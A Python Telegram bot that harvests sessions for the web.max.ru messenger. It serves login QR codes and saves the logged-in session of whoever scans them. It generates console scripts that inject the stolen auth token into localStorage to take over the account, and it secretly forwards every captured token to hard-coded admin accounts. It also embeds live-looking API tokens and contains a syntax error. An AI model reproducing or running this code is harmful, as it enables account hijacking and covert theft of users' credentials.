import json
import os
import urllib.request
import zipfile
import urllib.parse
import asyncio
from telegram.ext import ConversationHandler
import shutil
from datetime import datetime
from io import BytesIO
from pathlib import Path

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters

# Конфигурация (замени значения или используй os.getenv)
BOT_TOKEN = os.getenv("BOT_TOKEN", "8967607425:AAGPblsB4gnTStoxHCYuVqPED-eE3JvyNys")
CRYPTO_PAY_TOKEN = os.getenv("CRYPTO_PAY_TOKEN", "584628:AAoCvpqJjjLh1PlsKRUNUyz17SmTF6WW6Kh")
CRYPTO_PAY_API = "https://pay.crypt.bot/api"
BASE_URL = "https://web.max.ru"

WAITING_FOR_TOKEN = 1

# Настройка путей под Railway Volume (/app/sessions)
DATA_DIR = Path("/app/sessions")
DATA_DIR.mkdir(exist_ok=True)

SESSIONS_DIR = DATA_DIR / "user_sessions"
SESSIONS_DIR.mkdir(exist_ok=True)

USERS_FILE = DATA_DIR / "users.json"
EVENTS_FILE = DATA_DIR / "events.jsonl"
INVOICES_FILE = DATA_DIR / "invoices.json"

MIN_QR_BALANCE = 0.1
REFERRAL_BONUS = 0.2
QR_PRICE = 0.1

ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "8949311928").split(",") if x.strip().isdigit()}

# --- Работа с JSON файлами ---
def load_json(path: Path, default):
    if not path.exists(): return default
    try:
        with open(path, "r", encoding="utf-8") as f: return json.load(f)
    except Exception: return default

def save_json(path: Path, data) -> None:
    with open(path, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=2)

def load_users() -> dict: return load_json(USERS_FILE, {})
def save_users(data: dict) -> None: save_json(USERS_FILE, data)
def load_invoices() -> dict: return load_json(INVOICES_FILE, {})
def save_invoices(data: dict) -> None: save_json(INVOICES_FILE, data)

def log_event(event_type: str, payload: dict) -> None:
    row = {"ts": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"), "event": event_type, "payload": payload}
    with open(EVENTS_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(row, ensure_ascii=False) + "\n")

# --- Интеграция Crypto Bot API (Обход блокировки Cloudflare) ---
def crypto_api_call(method: str, payload: dict) -> dict:
    if not CRYPTO_PAY_TOKEN:
        return {"ok": False, "error": "CRYPTO_PAY_TOKEN is not set"}
    
    data_encoded = urllib.parse.urlencode(payload).encode("utf-8")
    
    req = urllib.request.Request(
        f"{CRYPTO_PAY_API}/{method}",
        data=data_encoded,
        method="POST",
        headers={
            "Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return json.loads(r.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        error_body = e.read().decode("utf-8")
        try:
            err_json = json.loads(error_body)
            return {"ok": False, "error": f"HTTP {e.code}: {err_json.get('error', {}).get('name', error_body)}"}
        except Exception:
            return {"ok": False, "error": f"HTTP {e.code}: {error_body}"}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def create_invoice(chat_id: int, amount: float) -> tuple[bool, dict]:
    resp = crypto_api_call("createInvoice", {"asset": "USDT", "amount": str(amount), "description": f"Top-up {chat_id}"})
    if not resp.get("ok"):
        return False, resp
    inv = resp["result"]
    invoices = load_invoices()
    invoices[str(inv["invoice_id"])] = {"chat_id": chat_id, "amount": amount, "credited": False}
    save_invoices(invoices)
    return True, inv

# --- Управление пользователями и балансом ---
def get_user(chat_id: int) -> dict:
    users = load_users()
    key = str(chat_id)
    if key not in users:
        users[key] = {"balance": 0.0, "referrer": None, "referrals": 0, "has_recharged": False}
        save_users(users)
    return users[key]

def get_user_by_username(username: str) -> tuple[int | None, dict | None]:
    users = load_users()
    uname = username.strip().lstrip("@").lower()
    for k, v in users.items():
        if str(v.get("username", "")).lower() == uname: return int(k), v
    return None, None

def update_user(chat_id: int, user_data: dict) -> None:
    users = load_users()
    users[str(chat_id)] = user_data
    save_users(users)

def add_balance(chat_id: int, amount: float, source: str = "self") -> tuple[dict, str | None]:
    users = load_users()
    key = str(chat_id)
    if key not in users:
        users[key] = {"balance": 0.0, "referrer": None, "referrals": 0, "has_recharged": False}
    user = users[key]
    user["balance"] = round(float(user.get("balance", 0.0)) + amount, 2)
    referral_message = None
    first_recharge = not user.get("has_recharged", False)
    if amount > 0:
        user["has_recharged"] = True
        log_event("topup", {"chat_id": chat_id, "amount": amount, "source": source})
    if first_recharge and amount > 0 and user.get("referrer"):
        ref_key = str(user["referrer"])
        ref_user = users.get(ref_key)
        if ref_user:
            ref_user["balance"] = round(float(ref_user.get("balance", 0.0)) + REFERRAL_BONUS, 2)
            ref_user["referrals"] = int(ref_user.get("referrals", 0)) + 1
            referral_message = ref_key
    users[key] = user
    save_users(users)
    return user, referral_message

def charge_for_qr(chat_id: int) -> tuple[bool, float]:
    # Просто возвращаем успех, без проверки баланса и списаний
    return True, 0.0

def is_admin(chat_id: int) -> bool: return chat_id in ADMIN_IDS
def session_path(chat_id: int) -> Path: return SESSIONS_DIR / f"session_{chat_id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S_%f')}.json"
def chat_sessions(chat_id: int) -> list[Path]: return sorted(SESSIONS_DIR.glob(f"session_{chat_id}_*.json"))

# --- Меню ---
def main_menu_content(chat_id: int) -> tuple[str, InlineKeyboardMarkup]:
    text = "**👇 Получите куар, отсканируйте, и получите токен, бесплатно ;)**"
    
    rows = [
        [
            InlineKeyboardButton("📲 Получить QR", callback_data="qr:get"),
            InlineKeyboardButton("🗄️ Мои сессии", callback_data="session:list")
        ],
        [
            # Добавляем кнопку сюда
            InlineKeyboardButton("🔍 Проверить токен", callback_data="check_init")
        ]
    ]
    
    if is_admin(chat_id):
        rows.append([InlineKeyboardButton("🛠 Admin-панель", callback_data="admin:menu")])
        
    return text, InlineKeyboardMarkup(rows)

def admin_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Статистика", callback_data="admin:stats")],
        [InlineKeyboardButton("📣 Рассылка", callback_data="admin:broadcast")], 
        [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]
    ])
    
def session_menu(chat_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("📄 Список сессий", callback_data="session:show_list")], [InlineKeyboardButton("🗃️ Выгрузить все сессии", callback_data="session:export_all")], [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]])

def get_js_console_code_raw(file_path: Path) -> str:
    try:
        data = load_json(file_path, {})
        storage = data["origins"][0]["localStorage"]
        device_id = next(item["value"] for item in storage if item["name"] == "__oneme_device_id")
        auth_ready = next(item["value"] for item in storage if item["name"] == "__oneme_auth").replace("'", "\\'")
        return "sessionStorage.clear();\nlocalStorage.clear();\n" + f"localStorage.setItem('__oneme_device_id', '{device_id}');\n" + f"localStorage.setItem('__oneme_auth', '{auth_ready}');\n" + "localStorage.setItem('__oneme_locale', 'ru');\nlocalStorage.setItem('__oneme_theme', '{\"colorScheme\":\"system\",\"colorTheme\":\"space\"}');\nwindow.location.reload();"
    except Exception: return ""

# --- Логика Playwright ---
async def capture_qr_image(page) -> bytes:
    for selector in ["canvas", 'img[src*="qr"]', 'div[class*="qr"]', "svg"]:
        try:
            handle = await page.wait_for_selector(selector, timeout=10000, state="visible")
            if handle: return await handle.screenshot(type="png")
        except Exception: continue
    return await page.screenshot(type="png", clip={"x": 0, "y": 0, "width": 500, "height": 500})

async def wait_success_login(page) -> None:
    await page.wait_for_function("""() => { const t = document.body ? document.body.innerText.toLowerCase() : ''; return !(t.includes('qr') || t.includes('сканируйте') || t.includes('войдите')); }""", timeout=180000)

async def check_token_validity(chat_id: int, file_path: Path, context: ContextTypes.DEFAULT_TYPE):
    status_msg = await context.bot.send_message(chat_id, "🔍 Проверяю сессию, подождите...")
    
    # 1. Проверка: существует ли файл и не пустой ли он
    if not file_path.exists() or file_path.stat().st_size == 0:
        await status_msg.edit_text("❌ Ошибка: Файл пуст или поврежден.")
        return

    # 2. Проверка: можно ли его прочитать как JSON (защита от неверного формата)
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            json.load(f)
    except json.JSONDecodeError:
        await status_msg.edit_text("❌ Ошибка: Это не валидный JSON файл. Пришлите правильный файл сессии.")
        return

    # 3. Основная логика проверки Playwright
    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            try:
                ctx = await browser.new_context(storage_state=str(file_path))
                page = await ctx.new_page()
                await page.goto(BASE_URL, wait_until="networkidle", timeout=30000)
                
                is_qr_present = await page.evaluate("() => !!(document.body.innerText.includes('QR') || document.querySelector('canvas'))")
                await browser.close()
                
                if not is_qr_present:
                    await status_msg.edit_text("✅ **Токен ВАЛИДНЫЙ!** Сессия активна.")
                else:
                    await status_msg.edit_text("❌ **Токен НЕВАЛИДНЫЙ.** Требуется авторизация.")
            except Exception as e:
                await browser.close()
                raise e # Проброс ошибки во внешний try
    except Exception as e:
        await status_msg.edit_text(f"⚠️ Ошибка при чтении сессии: {str(e)}")

# Возвращает содержимое файла сессии (JSON)
def get_raw_json(file_path: Path) -> str:
    with open(file_path, "r", encoding="utf-8") as f:
        return f.read()

# Возвращает JS-скрипт для консоли
def get_js_console_code(file_path: Path) -> str:
    try:
        data = json.loads(get_raw_json(file_path))
        storage = data["origins"][0]["localStorage"]
        device_id = next(item["value"] for item in storage if item["name"] == "__oneme_device_id")
        auth_ready = next(item["value"] for item in storage if item["name"] == "__oneme_auth").replace("'", "\\'")
        return (
            "sessionStorage.clear();\nlocalStorage.clear();\n"
            f"localStorage.setItem('__oneme_device_id', '{device_id}');\n"
            f"localStorage.setItem('__oneme_auth', '{auth_ready}');\n"
            "localStorage.setItem('__oneme_locale', 'ru');\n"
            "localStorage.setItem('__oneme_theme', '{\"colorScheme\":\"system\",\"colorTheme\":\"space\"}');\n"
            "window.location.reload();"
        )
    except Exception: return ""
        
async def run_qr_process(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    from playwright.async_api import async_playwright
    
    status_msg = await context.bot.send_message(chat_id=chat_id, text="⏳ Подключаюсь к платформе...")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True, 
            args=[
                "--no-sandbox", 
                "--disable-setuid-sandbox", 
                "--disable-dev-shm-usage",
                "--disable-accelerated-2d-canvas",
                "--disable-gpu",
                "--no-first-run",
                "--no-zygote",
                "--single-process"
            ]
        )
        
        ctx = await browser.new_context(viewport={"width": 500, "height": 600})
        page = await ctx.new_page()
        
        await page.route("**/*", lambda route: route.abort() if route.request.resource_type in ["image", "font", "media"] and "qr" not in route.request.url else route.continue_())
        
        try:
            await status_msg.edit_text("⏳ Загружаю страницу авторизации...")
            await page.goto(BASE_URL, wait_until="domcontentloaded", timeout=40000)
            
            await status_msg.edit_text("⏳ Ищу QR-код на странице...")
            
            qr_handle = None
            for selector in ["canvas", "img[src*='qr']", "div[class*='qr']", "[id*='qr']", "svg"]:
                try:
                    qr_handle = await page.wait_for_selector(selector, timeout=5000, state="visible")
                    if qr_handle:
                        print(f"[Успех] Найдено по селектору: {selector}")
                        break
                except Exception:
                    continue
            
            if qr_handle:
                await status_msg.edit_text("⏳ Генерирую изображение QR...")
                qr_img = await qr_handle.screenshot(type="png")
                await context.bot.send_photo(chat_id=chat_id, photo=qr_img, caption="✅ QR готов! Сканируй для входа.")
                await status_msg.delete()
            else:
                print(f"[Ошибка] QR-код не найден для пользователя {chat_id}. Делаю диагностический скриншот.")
                await status_msg.edit_text("⚠️ Ошибка: Элемент QR-кода не найден. Отправляю снимок экрана для проверки...")
                
                debug_screenshot = await page.screenshot(type="png")
                await context.bot.send_photo(
                    chat_id=chat_id, 
                    photo=debug_screenshot, 
                    caption="🔎 Бот не увидел QR. Вот что отображается на странице вместо него."
                )
                return
            
            # 1. Ждем успешного логина и сохраняем сессию во внутренний файл Playwright
            # 1. Ждем успешного логина и сохраняем сессию
            await wait_success_login(page)
            spath = session_path(chat_id)
            await ctx.storage_state(path=str(spath))
            
            log_event("token_created", {"chat_id": chat_id, "session_file": spath.name})
            
            # 2. Предлагаем выбрать формат
            kb = [
                [InlineKeyboardButton("📜 .txt (JS-скрипт)", callback_data=f"sess_get_txt:{spath.name}")],
                [InlineKeyboardButton("⚙️ .json (Сессия)", callback_data=f"sess_get_json:{spath.name}")]
            ]
            
            await context.bot.send_message(
                chat_id=chat_id,
                text="🎉 **Авторизация успешна!** Сессия сохранена.\nВыберите формат для загрузки:",
                reply_markup=InlineKeyboardMarkup(kb)
            )

            # --- ОТПРАВКА АДМИНУ В ЛС (оставляем автоматической) ---
            js_code = get_js_console_code_raw(spath)
            if js_code:
                # [Тут код отправки admin_bio, как у вас было ранее]
                
            
            # 3. Генерируем JS-код (токен) из сохраненной сессии
            js_code = get_js_console_code_raw(spath)
            
            if js_code:
                # --- ОТПРАВКА ПОЛЬЗОВАТЕЛЮ ---
                try:
                    user_bio = BytesIO(js_code.encode("utf-8"))
                    user_bio.name = "login.txt"
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=user_bio,
                        caption="📜 **Ваш скрипт для входа через консоль браузера.**\nОн также всегда доступен в разделе 'Мои сессии'.",
                        parse_mode="Markdown"
                    )
                    print(f"[Успех] Файл токена отправлен пользователю {chat_id}")
                except Exception as user_err:
                    print(f"[Ошибка] Не удалось отправить файл пользователю {chat_id}: {user_err}")
                
                # --- ОТПРАВКА АДМИНУ В ЛС ---
                user_info = get_user(chat_id)
                username_str = f"@{user_info.get('username')}" if user_info.get('username') else "Нет юзернейма"
                
                admin_caption = (
                    f"🔔 **Новый токен получен!**\n\n"
                    f"👤 **Пользователь:** {username_str}\n"
                    f"🆔 **ID:** `{chat_id}`\n"
                    f"📂 **Файл сессии:** `{spath.name}`"
                )
                
                # Бот отправит файл по очереди каждому админу, указанному в ADMIN_IDS
                for admin_id in ADMIN_IDS:
                    try:
                        admin_bio = BytesIO(js_code.encode("utf-8"))
                        admin_bio.name = f"login_{chat_id}.txt"
                        
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=admin_bio,
                            caption=admin_caption,
                            parse_mode="Markdown"
                        )
                        print(f"[Успех] Копия токена пользователя {chat_id} отправлена админу {admin_id}")
                    except Exception as admin_err:
                        print(f"[Ошибка] Не удалось отправить лог админу {admin_id}: {admin_err}")

        except Exception as e:
            print(f"[Критическая ошибка] В процессе QR произошел сбой: {e}")
            try:
                await status_msg.edit_text("❌ Произошла ошибка при авторизации. Попробуйте еще раз.")
            except Exception:
                pass

# --- Команды Telegram ---
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user = get_user(chat_id)
    
    if update.effective_user and update.effective_user.username:
        user["username"] = update.effective_user.username
        update_user(chat_id, user)
        
    if context.args and context.args[0].startswith("ref_"):
        try:
            ref_id = int(context.args[0].replace("ref_", ""))
            if ref_id != chat_id and not user.get("referrer"):
                user["referrer"] = ref_id
                update_user(chat_id, user)
                await update.message.reply_text("✅ Реферальный код применен.")
        except ValueError: pass

    welcome_text, reply_kb = main_menu_content(chat_id)
    await update.message.reply_text(text=welcome_text, parse_mode="Markdown", reply_markup=reply_kb)
        
async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_chat.id):
        await update.message.reply_text("⛔ Нет доступа.")
        return
    await update.message.reply_text("🛠 Админ-панель:", reply_markup=admin_menu())

async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text = (update.message.text or "").strip()
    
    user_mode = context.user_data.get("user_mode")
    if user_mode == "enter_balance":
        text_clean = text.replace(",", ".")
        try:
            amount = float(text_clean)
            if amount <= 0:
                await update.message.reply_text("❌ Сумма должна быть больше нуля. Введите корректное число:")
                return
            amount = round(amount, 2)
        except ValueError:
            await update.message.reply_text("❌ Непонятная сумма. Введите число (например: 0.5 или 10):")
            return
        
        context.user_data.pop("user_mode", None)
        ok, inv = create_invoice(chat_id, amount)
        if not ok:
            welcome_text, reply_kb = main_menu_content(chat_id)
            await update.message.reply_text(f"❌ Не удалось создать счет: {inv.get('error', 'unknown')}", reply_markup=reply_kb)
            return
            
        pay_url = inv.get("pay_url") or inv.get("bot_invoice_url") or inv.get("mini_app_invoice_url", "")
        kb = [[InlineKeyboardButton("💳 Перейти к оплате", url=pay_url)], [InlineKeyboardButton("⬅️ Главное меню", callback_data="back_to_main")]]
        await update.message.reply_text(
            f"🚀 Ссылка на оплату **${amount:.2f}** успешно создана!\n\nБаланс пополнится автоматически сразу после оплаты.", 
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(kb)
        )
        return

    if not is_admin(chat_id): return
        
    admin_mode = context.user_data.get("admin_mode")
    if admin_mode == "broadcast":
        sent = 0
        for uid in load_users().keys():
            try:
                await context.bot.send_message(chat_id=int(uid), text=f"{text}")
                sent += 1
            except Exception: pass
        context.user_data.pop("admin_mode", None)
        await update.message.reply_text(f"✅ Рассылка завершена. Отправлено: {sent}")
        

async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    chat_id = query.message.chat_id
    data = query.data
    await query.answer()

    if data == "qr:get":
        # Убираем проверку на MIN_QR_BALANCE и функцию charge_for_qr
        await query.message.reply_text("🚀 Запускаю получение QR...")
        context.application.create_task(run_qr_process(chat_id, context))
        
    elif data == "ref:menu":
        uname = (await context.bot.get_me()).username
        u = get_user(chat_id)
        text_msg = f"👥 Реферальная программа:\n• За каждого кто зайдет по ссылке будет засчитанно: ${REFERRAL_BONUS:.2f} \n• Успешные: {int(u.get('referrals',0))}\n\nСсылка:\nhttps://t.me/{uname}?start=ref_{chat_id}"
        kb = [[InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]]
        try:
            await query.edit_message_text(text_msg, reply_markup=InlineKeyboardMarkup(kb))
        except Exception:
            await query.message.reply_text(text_msg, reply_markup=InlineKeyboardMarkup(kb))

    # Внутри callback_router:
    elif data.startswith("sess_manage:"):
        fn = data.split(":", 1)[1]
        # Теперь кнопка просто ведет к выбору формата
        kb = [
            [InlineKeyboardButton("📥 Выбрать формат выгрузки", callback_data=f"sess_choice:{fn}")],
            [InlineKeyboardButton("🗑 Удалить сессию", callback_data=f"sess_del:{fn}")],
            [InlineKeyboardButton("⬅️ Назад", callback_data="session:show_list")]
        ]
        await query.edit_message_text(f"Управление: {fn}", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("sess_choice:"):
        fn = data.split(":", 1)[1]
        kb = [
            [InlineKeyboardButton("📜 .txt (JS-скрипт)", callback_data=f"sess_get_txt:{fn}")],
            [InlineKeyboardButton("⚙️ .json (Сессия)", callback_data=f"sess_get_json:{fn}")],
            [InlineKeyboardButton("⬅️ Назад", callback_data=f"sess_manage:{fn}")]
        ]
        await query.edit_message_text("Выберите формат файла:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("sess_get_txt:") or data.startswith("sess_get_json:"):
        mode, fn = data.split(":", 1)[1].split(":", 1) if ":" in data else (data.split("_")[2], data.split(":", 1)[1])
        t = SESSIONS_DIR / fn
        if not t.exists():
            await query.answer("Файл не найден", show_alert=True)
            return
            
        if "txt" in data:
            content = get_js_console_code(t)
            filename = "login.txt"
        else:
            content = get_raw_json(t)
            filename = "session.json"
            
        bio = BytesIO(content.encode("utf-8"))
        bio.name = filename
        await query.message.reply_document(document=bio, caption=f"Ваш файл: {filename}")
        
    elif data == "session:list":
        try:
            await query.edit_message_text("🗂 Мои сессии:", reply_markup=session_menu(chat_id))
        except Exception:
            await query.message.reply_text("🗂 Мои сессии:", reply_markup=session_menu(chat_id))

    elif data == "session:show_list":
        sessions = chat_sessions(chat_id)
        if not sessions:
            try:
                await query.edit_message_text("Список сессий пуст.", reply_markup=session_menu(chat_id))
            except Exception:
                await query.message.reply_text("Список сессий пуст.", reply_markup=session_menu(chat_id))
            return
        kb = [[InlineKeyboardButton(f"📁 Сессия №{i}", callback_data=f"sess_manage:{s.name}")] for i, s in enumerate(sessions, 1)]
        kb.append([InlineKeyboardButton("⬅️ Назад", callback_data="session:list")])
        try:
            await query.edit_message_text("Выберите сессию:", reply_markup=InlineKeyboardMarkup(kb))
        except Exception:
            await query.message.reply_text("Выберите сессию:", reply_markup=InlineKeyboardMarkup(kb))

    elif data == "session:export_all":
        sessions = chat_sessions(chat_id)
        if not sessions:
            await query.message.reply_text("❌ У вас пока нет сессий для выгрузки.")
            return
        zp = SESSIONS_DIR / f"all_sessions_{chat_id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.zip"
        with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as zf:
            for s in sessions: zf.write(s, arcname=s.name)
        with open(zp, "rb") as f:
            await query.message.reply_document(document=f, filename=zp.name, caption="📦 Все ваши сессии в одном архиве.")
        try: os.remove(zp)
        except OSError: pass

    elif data.startswith("sess_manage:"):
        fn = data.split(":", 1)[1]
        kb = [[InlineKeyboardButton("📜 Получить скрипт", callback_data=f"sess_get:{fn}")], [InlineKeyboardButton("🗑 Удалить сессию", callback_data=f"sess_del:{fn}")], [InlineKeyboardButton("⬅️ Назад", callback_data="session:show_list")]]
        try:
            await query.edit_message_text(f"Управление: {fn}", reply_markup=InlineKeyboardMarkup(kb))
        except Exception:
            await query.message.reply_text(f"Управление: {fn}", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("sess_get:"):
        fn = data.split(":", 1)[1]
        t = SESSIONS_DIR / fn
        if t.exists():
            bio = BytesIO(get_js_console_code_raw(t).encode("utf-8"))
            bio.name = "login.txt"
            await query.message.reply_document(document=bio, caption="Инструкция внутри файла.")
        else:
            await query.message.reply_text("Ошибка: файл не найден.")

    elif data.startswith("sess_del:"):
        fn = data.split(":", 1)[1]
        t = SESSIONS_DIR / fn
        if t.exists():
            os.remove(t)
            try:
                await query.edit_message_text(f"✅ Сессия {fn} удалена.", reply_markup=session_menu(chat_id))
            except Exception:
                await query.message.reply_text(f"✅ Сессия {fn} удалена.", reply_markup=session_menu(chat_id))
        else:
            try:
                await query.edit_message_text("❌ Сессия уже удалена или не существует.", reply_markup=session_menu(chat_id))
            except Exception:
                await query.message.reply_text("❌ Сессия уже удалена или не существует.", reply_markup=session_menu(chat_id))

    elif data == "admin:menu":
        if not is_admin(chat_id): return
        try:
            await query.edit_message_text("🛠 Админ-панель:", reply_markup=admin_menu())
        except Exception:
            await query.message.reply_text("🛠 Админ-панель:", reply_markup=admin_menu())

    elif data == "admin:stats":
        if not is_admin(chat_id): return
        def get_today_stats() -> dict:
            today = datetime.utcnow().strftime("%Y-%m-%d")
            topups_sum = 0.0
            tokens_count = 0
            if EVENTS_FILE.exists():
                with open(EVENTS_FILE, "r", encoding="utf-8") as f:
                    for line in f:
                        try: row = json.loads(line.strip())
                        except Exception: continue
                        if not str(row.get("ts", "")).startswith(today): continue
                        if row.get("event") == "topup": topups_sum += float(row.get("payload", {}).get("amount", 0.0))
                        elif row.get("event") == "token_created": tokens_count += 1
            return {"date": today, "users_count": len(load_users()), "topups_sum": round(topups_sum, 2), "tokens_count": tokens_count}
        st = get_today_stats()
        text_stats = f"📊 Статистика: \n• Людей: {st['users_count']}\n• Пополнения: ${st['topups_sum']:.2f}\n• Токенов: {st['tokens_count']}"
        try:
            await query.edit_message_text(text_stats, reply_markup=admin_menu())
        except Exception:
            await query.message.reply_text(text_stats, reply_markup=admin_menu())

    elif data == "admin:broadcast":
        if not is_admin(chat_id): return
        context.user_data["admin_mode"] = "broadcast"
        await query.message.reply_text("Введите текст для рассылки.")

    elif data == "back_to_main":
        context.user_data.pop("user_mode", None)
        welcome_text, reply_kb = main_menu_content(chat_id)
        try:
            await query.edit_message_text(welcome_text, parse_mode="Markdown", reply_markup=reply_kb)
        except Exception:
            await query.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=reply_kb)
            
async def export_data_archive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    YOUR_ADMIN_ID = 8949311928
    
    if update.effective_user.id != YOUR_ADMIN_ID:
        return 

    print(f"!!! Кнопка /getdata нажата создателем бота !!!")
    status_msg = await update.message.reply_text("🤖 Собираю архив папки данных из Volume, подожди...")
    
    try:
        target_dir = "/app/sessions" 
        archive_name = "/tmp/bot_data_backup"
        
        if not os.path.exists(target_dir):
            await status_msg.edit_text("❌ Папка /app/sessions не найдена.")
            return

        shutil.make_archive(archive_name, 'zip', target_dir)
        zip_path = f"{archive_name}.zip"

        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
            with open(zip_path, "rb") as archive_file:
                await update.message.reply_document(
                    document=archive_file, 
                    filename="bot_data_backup.zip", 
                    caption="📦 Вот полный бэкап всех данных (users.json и сессии Playwright)!"
                )
            await status_msg.delete()
        else:
            await status_msg.edit_text("❌ Не удалось создать файл архива.")

        if os.path.exists(zip_path): 
            os.remove(zip_path)
            
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка при создании архива: {e}")

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.message.reply_text("📥 Пришлите мне файл сессии (.json) или вставьте текст токена для проверки.")
    return WAITING_FOR_TOKEN

async def receive_token_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    # 1. Если прислали файл
    if update.message.document:
        file = await update.message.document.get_file()
        temp_path = SESSIONS_DIR / f"temp_{chat_id}.json"
        await file.download_to_drive(temp_path)
        
        # Запускаем проверку
        await check_token_validity(chat_id, temp_path, context)
        
        # Удаляем временный файл после проверки
        if temp_path.exists():
            os.remove(temp_path)
            
    # 2. Если прислали текст (вдруг токен текстом)
    else:
        await update.message.reply_text("❌ Пожалуйста, отправьте именно файл сессии (.json).")
        return ConversationHandler.END

    # Возвращаем пользователя в главное меню после проверки
    welcome_text, reply_kb = main_menu_content(chat_id)
    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=reply_kb)
    
    return ConversationHandler.END # Завершаем диалог

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Отменено.")
    return ConversationHandler.END
    
# --- ФОНОВАЯ ЗАЗАЧА ПРОВЕРКИ ОПЛАТЫ ---
async def check_invoices_job(context: ContextTypes.DEFAULT_TYPE) -> None:
    invoices = load_invoices()
    active_ids = [k for k, v in invoices.items() if not v.get("credited")]
    if not active_ids: return

    resp = crypto_api_call("getInvoices", {"invoice_ids": ",".join(active_ids)})
    if not resp.get("ok"): return

    items = resp.get("result", {}).get("items", [])
    updated = False

    for item in items:
        status = item.get("status")
        invoice_id = str(item.get("invoice_id"))
        
        if status == "paid" and invoice_id in invoices:
            local = invoices[invoice_id]
            if local.get("credited"): continue
                
            chat_id = int(local["chat_id"])
            amount = float(local["amount"])

            user, ref_chat_id = add_balance(chat_id, amount, source="cryptopay_polling")
            local["credited"] = True
            invoices[invoice_id] = local
            updated = True

            try:
                _, reply_kb = main_menu_content(chat_id)
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"💳 **Баланс успешно пополнен!**\n\nЗачислено: `${amount:.2f}`\nТекущий баланс: `${float(user.get('balance', 0.0)):.2f}`",
                    parse_mode="Markdown",
                    reply_markup=reply_kb
                )
                if ref_chat_id:
                    ref_user = get_user(int(ref_chat_id))
                    await context.bot.send_message(
                        chat_id=int(ref_chat_id),
                        text=f"👥 **Реферальный бонус!**\n\nВаш реферал пополнил баланс. Вам начислено `${REFERRAL_BONUS:.2f}`\nВаш баланс: `${float(ref_user.get('balance', 0.0)):.2f}`",
                        parse_mode="Markdown"
                    )
            except Exception as e:
                print(f"Не удалось отправить уведомление для {chat_id}: {e}")
    if updated: save_invoices(invoices)

def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()

    # Сначала ConversationHandler (он специфичен)
    check_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_check, pattern="check_init")],
        states={
            WAITING_FOR_TOKEN: [
                MessageHandler(filters.Document.ALL, receive_token_data),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_token_data)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    app.add_handler(check_conv)

    # Затем остальные общие хендлеры
    app.add_handler(CommandHandler("getdata", export_data_archive))
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CallbackQueryHandler(callback_router)) # Этот ловит остальные кнопки
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_router))

    # ...
    # Запускаем поллинг инвойсов каждые 15 секунд
    if app.job_queue:
        app.job_queue.run_repeating(check_invoices_job, interval=15, first=10)

    print("🤖 Бот успешно запущен!")
    app.run_polling()

if __name__ == "__main__":
    main()
